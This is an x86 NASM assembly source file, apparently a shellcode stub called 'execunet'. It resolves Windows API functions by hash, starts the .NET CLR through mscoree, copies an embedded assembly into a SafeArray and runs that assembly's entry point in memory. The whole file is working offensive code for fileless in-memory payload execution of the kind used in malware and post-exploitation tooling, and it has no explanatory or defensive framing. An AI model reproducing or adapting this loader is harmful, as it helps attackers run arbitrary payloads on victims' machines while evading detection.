%define RUNTIMEVERSION_VALUE "v4.0.30319"

OLEAUT32_HASH		                  equ 0x000d8c88
OLEAUT32_NUMBER_OF_FUNCTIONS    	  equ 6
OLEAUT32_SAFEARRAYCREATE_HASH 		  equ 0x006b5472
OLEAUT32_SAFEARRAYCREATEVECTOR_HASH   equ 0x1ad55310
OLEAUT32_SAFEARRAYACCESSDATA_HASH  	  equ 0x06b52e7a
OLEAUT32_SAFEARRAYUNACCESSDATA_HASH	  equ 0x1ad6367a
OLEAUT32_SAFEARRAYGETLBOUND_HASH	  equ 0x035aad58
OLEAUT32_SAFEARRAYGETUBOUND_HASH	  equ 0x035aaf98

KERNEL32_HASH 					equ 0x000d4e88
KERNEL32_NUMBER_OF_FUNCTIONS	equ 4
KERNEL32_LOADLIBRARYA_HASH		equ 0x000d5786
KERNEL32_GETPROCADDRESS_HASH	equ 0x00348bfa
KERNEL32_VIRTUALALLOC_HASH		equ 0x000e3142
KERNEL32_VIRTUALFREE_HASH		equ 0x0007188e

MSCOREE_HASH 				   equ 0x0006d468
MSCOREE_NUMBER_OF_FUNCTIONS    equ 1
MSCOREE_CLRCREATEINSTANCE_HASH equ 0x019ec916

struc SAFEARRAYBOUND
	.cElements resb 8
	.lLbound   resb 8
	.size:
endstruc

; populate ESI with pointer to requested variable
%macro GET_TLS_VAR 1
	mov esi, [fs:0x14]
	add esi, %1
%endmacro

%macro GET_TLS_VAR_ABS 1
	mov esi, [fs:0x14]
	mov esi, [esi+%1]
%endmacro

execunet:
    ; mapping is:
	; fs:0x38 = kernel32!LoadLibraryA
	; fs:0x3c = oleaut32!SafeArrayCreate
	; fs:0x40 = oleaut32!SafeArrayCreateVector
	; fs:0x44 = oleaut32!SafeArrayAccessData
	; fs:0x48 = oleaut32!SafeArrayUnaccessData
	; fs:0x4c = mscoree!_ClrCreateInstance
	; fs:0x50 = pCLRMetaHost
	; fs:0x54 = pCLRRuntimeInfo
	; fs:0x58 = pCorRuntimeHost
	; fs:0x5c = pAppDomainThunk
	; fs:0x60 = pAppDomain
	; fs:0x64 = lpSafeData
	; fs:0x68 = pAssembly
	; fs:0x6c = pMethodInfo
	; fs:0x70 = pMethodArgs
	; fs:0x74 = pSafeArray
	; fs:0x78 = sabSafeArray
	; fs:0x7c = pMethodParams
	; fs:0x80 = oleaut32!SafeArrayGetLBound
	; fs:0x84 = oleaut32!SafeArrayGetUBound
	; fs:0x8c = lLower
	; fs:0x90 = lUpper
    
	; resolve VirtualAlloc
	push KERNEL32_VIRTUALALLOC_HASH
	push KERNEL32_HASH
	call GetFunctionAddress

	; VirtualAlloc(0, 0x300, MEM_COMMIT, PAGE_READWRITE)
	push 0x04
	push 0x1000
	push 0x300
	push 0x0
	call eax
	test eax, eax
	jz done
	mov esi, [fs:0x18]
	mov [esi+0x14], eax

	; resolve LoadLibrary
	push KERNEL32_LOADLIBRARYA_HASH
	push KERNEL32_HASH
	call GetFunctionAddress
	GET_TLS_VAR 0x38
	mov [esi], eax

	; LoadLibrary(oleaut32.dll)
	lea esi, [OLEAUT32DLL-geteip+ebx]
	push esi
	GET_TLS_VAR 0x38
	call [esi]

	; LoadLibrary(mscoree.dll)
	lea esi, [MSCOREEDLL-geteip+ebx]
	push esi
	GET_TLS_VAR 0x38
	call [esi]

	; resolve OLEAUT32!SafeArrayCreate
	push OLEAUT32_SAFEARRAYCREATE_HASH
	push OLEAUT32_HASH
	call GetFunctionAddress
	GET_TLS_VAR 0x3c
	mov [esi], eax

	; resolve OLEAUT32!SafeArrayCreateVector
	push OLEAUT32_SAFEARRAYCREATEVECTOR_HASH
	push OLEAUT32_HASH
	call GetFunctionAddress
	GET_TLS_VAR 0x40
	mov [esi], eax

	; resolve OLEAUT32!SafeArrayAccessData
	push OLEAUT32_SAFEARRAYACCESSDATA_HASH
	push OLEAUT32_HASH
	call GetFunctionAddress
	GET_TLS_VAR 0x44
	mov [esi], eax

	; resolve OLEAUT32!SafeArrayUnaccessData
	push OLEAUT32_SAFEARRAYUNACCESSDATA_HASH
	push OLEAUT32_HASH
	call GetFunctionAddress
	GET_TLS_VAR 0x48
	mov [esi], eax

	; resolve oleaut32!SafeArrayGetLBound
	push OLEAUT32_SAFEARRAYGETLBOUND_HASH
	push OLEAUT32_HASH
	call GetFunctionAddress
	GET_TLS_VAR 0x80
	mov [esi], eax

	; resolve oleaut32!SafeArrayGetUBound
	push OLEAUT32_SAFEARRAYGETUBOUND_HASH
	push OLEAUT32_HASH
	call GetFunctionAddress
	GET_TLS_VAR 0x84
	mov [esi], eax

	; resolve mscoree!_ClrCreateInstance
	push MSCOREE_CLRCREATEINSTANCE_HASH
	push MSCOREE_HASH
	call GetFunctionAddress
	GET_TLS_VAR 0x4c
	mov [esi], eax

	; _CLRCreateinstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, &pCLRMetaHost)
	GET_TLS_VAR 0x50
	push esi
	lea esi, [IID_ICLRMetaHost-geteip+ebx]
	push esi
	lea esi, [CLSID_CLRMETAHOST-geteip+ebx]
	push esi
	GET_TLS_VAR 0x4c
	call [esi]
	test eax,eax
	jnz done

	; pCLRMetaHost->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo, (void**)&pCLRRuntimeInfo)
	GET_TLS_VAR 0x54
	push esi
	lea esi, [IID_ICLRRUNTIMEINFO-geteip+ebx]
	push esi
	lea esi, [RUNTIMEVERSION-geteip+ebx]
	push esi
	GET_TLS_VAR 0x50
	mov edx, [esi]
	push edx
	mov ecx, [edx]
	call [ecx+0x0c]
	test eax,eax
	jnz done

	; pCLRRuntimeInfo->GetInterface(CLSID_CorRuntimeHost,IID_ICorRuntimeHost, (void**)&pCorRuntimeHost)
	GET_TLS_VAR 0x58
	push esi
	lea esi, [IID_ICORRUNTIMEHOST-geteip+ebx]
	push esi
	lea esi, [CLSID_CORRUNTIMEHOST-geteip+ebx]
	push esi
	GET_TLS_VAR 0x54
	mov edx, [esi]
	push edx
	mov ecx, [edx]
	call [ecx+0x24]
	test eax,eax
	jnz done

	; pCorRuntimeHost->Start()
	GET_TLS_VAR 0x58
	mov edx, [esi]
	push edx
	mov ecx, [edx]
	call [ecx+0x28]
	test eax,eax
	jnz done

    %ifdef APPDOMAIN_VALUE
        ; pCorRuntimeHost->CreateDomain(APPDOMAIN_VALUE, null (void**)&pAppDomainThunk)
        GET_TLS_VAR 0x5c
        push esi
        push 0
        lea esi, [APPDOMAINNAME-geteip+ebx]
        push esi
        GET_TLS_VAR 0x58
        mov edx, [esi]
        push edx
        mov ecx, [edx]
        call [ecx+0x30]
        test eax,eax
        jnz done
    %else 
        ; pCorRuntimeHost->GetDefaultDomain(&pAppDomainThunk)
        GET_TLS_VAR 0x5c
        push esi
        GET_TLS_VAR 0x58
        mov edx, [esi]
        push edx
        mov ecx, [edx]
        call [ecx+0x34]
        test eax,eax
        jnz done
    %endif

	; pAppDomainThunk->QueryInterface(__uuidof(mscorlib::_AppDomain), (void**)&pAppDomain)
	GET_TLS_VAR 0x60
	push esi
	lea esi, [CLSID_APPDOMAIN-geteip+ebx]
	push esi
	GET_TLS_VAR 0x5c
	mov edx, [esi]
	push edx
	mov ecx, [edx]
	call [ecx]
	test eax,eax
	jnz done

	; safeArrayBound->cElements = ASSEMBLY_LENGTH;
	GET_TLS_VAR 0x78
	mov [esi+SAFEARRAYBOUND.cElements], dword ASSEMBLY_LENGTH

	; safeArrayBound->lLbound = 0;
	mov [esi+0x4], dword 0x00

	; pSafeArray = SafeArrayCreate(VT_UI1, 1, safeArrayBound);
	GET_TLS_VAR 0x78
	push esi
	push byte 0x1
	push byte 0x11
	GET_TLS_VAR 0x3c
	call [esi]
	test eax,eax
	jz done
	GET_TLS_VAR 0x74
	mov [esi], eax

	; SafeArrayAccessData(pSafeArray, &lpSafeData)
	GET_TLS_VAR 0x64
	push esi
	GET_TLS_VAR_ABS 0x74
	push esi
	GET_TLS_VAR 0x44
	call [esi]
	test eax,eax
	jnz done

	; memcpy(lpSafeData, ASSEMBLY, ASSEMBLY_LENGTH)
	GET_TLS_VAR_ABS 0x64
	mov edi, esi
	lea esi, [ASSEMBLY-geteip+ebx]
	mov ecx, dword ASSEMBLY_LENGTH
	rep movsb

	; SafeArrayUnaccessData(pSafeArray)
	GET_TLS_VAR_ABS 0x74
	push esi
	GET_TLS_VAR 0x48
	call [esi]
	test eax,eax
	jnz done

	; pAppDomain->Load_3(pSafeArray, &pAssembly)
	GET_TLS_VAR 0x68
	push esi
	GET_TLS_VAR_ABS 0x74
	push esi
	GET_TLS_VAR 0x60
	mov edx, [esi]
	push edx
	mov ecx, [edx]
	call [ecx+0xb4]
	test eax,eax
	jnz done

	; pAssembly->get_EntryPoint(&pMethodInfo)
	GET_TLS_VAR 0x6c
	push esi
	GET_TLS_VAR 0x68
	mov edx, [esi]
	push edx
	mov ecx, [edx]
	call [ecx+0x40]
	test eax,eax
	jnz done

	; pMethodInfo->GetParameters(&pMethodParams)
	GET_TLS_VAR 0x7c
	push esi
	GET_TLS_VAR 0x6c
	mov edx, [esi]
	push edx
	mov ecx, [edx]
	call [ecx+0x48]
	test eax,eax
	jnz done

	;SafeArrayGetLBound(pMethodParams, 1, &lLower);
	GET_TLS_VAR 0x8c
	push esi
	push 1
	GET_TLS_VAR_ABS 0x7c
	push esi
	GET_TLS_VAR 0x80
	call [esi]
	test eax,eax 
	jnz done
	
	;SafeArrayGetUBound(pMethodParams, 1, &lUpper);
	GET_TLS_VAR 0x90
	push esi
	push 1
	GET_TLS_VAR_ABS 0x7c
	push esi
	GET_TLS_VAR 0x84
	call [esi]
	test eax,eax
	jnz done

	;lArgs = (lUpper - lLower) + 1;
	;support Main() and Main(string[] args)
	GET_TLS_VAR_ABS 0x90
	mov eax, esi
	GET_TLS_VAR_ABS 0x8c
	mov ebx, esi
	sub eax, ebx
	add eax, 1
	; if args > 1, return
	cmp eax, 1
	jg done

	;pMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, lArgs);
	push eax
	push byte 0
	push byte 0x0c
	GET_TLS_VAR 0x40
	call [esi]
	test eax,eax
	jz done
	GET_TLS_VAR 0x70
	mov [esi], eax

	; pMethodInfo->Invoke_3(obj, pMethodArgs, NULL);
	; i assure you it doesn't care about the VARIANT and requires all these
	; null dwords
	push 0
	GET_TLS_VAR_ABS 0x70
	push esi
	push 0x00000000
	push 0x00000000
	push 0x00000000
	push 0x00000000
	GET_TLS_VAR 0x6c
	mov edx, [esi]
	push edx
	mov ecx, [edx]
	call [ecx+0x94]
	test eax,eax
	jnz done

	; resolve VirtualFree
	push KERNEL32_VIRTUALFREE_HASH
	push KERNEL32_HASH
	call GetFunctionAddress

	; VirtualFree
	push 0x4000
	push 0x300
	mov esi, [fs:0x18]
	push dword [esi+0x14]
	call eax

	jmp done

done:
	ret

CLSID_CLRMETAHOST:
db 0x8d,0x18,0x80,0x92,0x8e,0x0e,0x67,0x48,0xb3,0x0c,0x7f,0xa8,0x38,0x84,0xe8,0xde
IID_ICLRMetaHost:
db 0x9e,0xdb,0x32,0xd3,0xb3,0xb9,0x25,0x41,0x82,0x07,0xa1,0x48,0x84,0xf5,0x32,0x16
IID_ICLRRUNTIMEINFO:
db 0xd2,0xd1,0x39,0xbd,0x2f,0xba,0x6a,0x48,0x89,0xb0,0xb4,0xb0,0xcb,0x46,0x68,0x91
IID_ICORRUNTIMEHOST:
db 0x22,0x67,0x2f,0xcb,0x3a,0xab,0xd2,0x11,0x9c,0x40,0x00,0xc0,0x4f,0xa3,0x0a,0x3e
CLSID_CORRUNTIMEHOST:
db 0x23,0x67,0x2f,0xcb,0x3a,0xab,0xd2,0x11,0x9c,0x40,0x00,0xc0,0x4f,0xa3,0x0a,0x3e
CLSID_APPDOMAIN:
db 0xdc,0x96,0xf6,0x05,0x29,0x2b,0x63,0x36,0xad,0x8b,0xc4,0x38,0x9c,0xf2,0xa7,0x13

CLRMETAHOST 	dd 0x00000000
CLRRUNTIMEINFO  dd 0x00000000
CORRUNTIMEHOST  dd 0x00000000
APPDOMAINTHUNK  dd 0x00000000
APPDOMAIN 		dd 0x00000000
SAFEARRAY 		dd 0x00000000
SAFEARRAYDATA   dd 0x00000000
CORASSEMBLY 	dd 0x00000000
METHODARGS  	dd 0x00000000
METHODINFO 		dd 0x00000000

sabSafeArray:  RESB SAFEARRAYBOUND.size

KERNEL32_HASHES_TABLE:
	dd KERNEL32_LOADLIBRARYA_HASH
	dd KERNEL32_GETPROCADDRESS_HASH
	dd KERNEL32_VIRTUALALLOC_HASH
	dd KERNEL32_VIRTUALFREE_HASH

OLEAUT32_HASHES_TABLE:
	dd OLEAUT32_SAFEARRAYCREATE_HASH
	dd OLEAUT32_SAFEARRAYCREATEVECTOR_HASH
	dd OLEAUT32_SAFEARRAYACCESSDATA_HASH
	dd OLEAUT32_SAFEARRAYUNACCESSDATA_HASH
	dd OLEAUT32_SAFEARRAYGETLBOUND_HASH
	dd OLEAUT32_SAFEARRAYGETUBOUND_HASH

MSCOREE_HASHES_TABLE:
	dd MSCOREE_CLRCREATEINSTANCE_HASH

MSCOREE_FUNCTIONS_TABLE:
    MSCOREE_CLRCREATEINSTANCE		dd 0x00000000

KERNEL32_FUNCTIONS_TABLE:
    KERNEL32_LOADLIBRARY 	dd 0x00000000
    KERNEL32_GETPROCADDRESS dd 0x00000000
    KERNEL32_VIRTUALALLOC   dd 0x00000000
    KERNEL32_VIRTUALFREE    dd 0x00000000

OLEAUT32_FUNCTIONS_TABLE:
    OLEAUT32_SAFEARRAYCREATE 		  dd 0x00000000
    OLEAUT32_SAFEARRAYCREATEVECTOR    dd 0x00000000
    OLEAUT32_SAFEARRAYACCESSDATA      dd 0x00000000
    OLEAUT32_SAFEARRAYUNACCESSDATA    dd 0x00000000
    OLEAUT32_SAFEARRAYGETLBOUND       dd 0x00000000
    OLEAUT32_SAFEARRAYGETUBOUND       dd 0x00000000

MSCOREEDLL:
	db "MSCOREE.dll", 0
OLEAUT32DLL:
	db "OleAut32.dll", 0

RUNTIMEVERSION:
	db __utf16__(RUNTIMEVERSION_VALUE), 0, 0